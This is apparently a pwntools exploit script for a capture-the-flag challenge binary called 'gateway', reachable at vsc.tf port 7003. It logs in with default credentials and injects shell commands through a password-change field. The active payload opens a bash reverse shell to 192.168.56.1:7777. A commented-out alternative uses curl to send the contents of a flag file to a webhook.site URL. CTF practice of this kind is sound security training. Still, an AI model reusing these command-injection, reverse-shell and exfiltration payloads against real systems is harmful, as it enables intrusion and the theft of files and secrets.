from pwn import *
from icecream import ic

elf = exe = ELF("./gateway")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("vsc.tf", 7003)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

sla(b"Username: ", b'admin')
sla(b"Password: ", b'123456')

sla(b"> ", b'5')
# sla(b"New password: ", b'"; curl https://webhook.site/cb266a6a-d8fb-49cc-b3fa-00d3efb2f7f1 -d "$(cat /home/user/flag.txt)"; " ')
sla(b"New password: ", b'";bash -c "sh -i >& /dev/tcp/192.168.56.1/7777 0>&1";#')
io.interactive()
